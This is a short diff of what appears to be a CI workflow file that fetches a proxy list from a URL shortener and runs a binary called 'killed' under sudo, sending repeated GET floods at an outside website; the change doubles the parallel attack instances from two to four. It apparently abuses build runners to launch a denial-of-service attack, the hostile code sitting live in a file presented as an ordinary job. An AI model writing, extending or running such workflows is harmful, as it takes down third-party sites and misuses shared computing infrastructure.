@@ -19,7 +19,7 @@ jobs:
           wget https://curl.by/ILl73/fres.txt
           chmod +x killed
           PIDS=()
-          for i in {1..2}; do
+          for i in {1..4}; do
             sudo timeout 90 ./killed GET https://antiddos.ooguy.com/ fres.txt 85 128 10 &
             PIDS+=($!)
           done
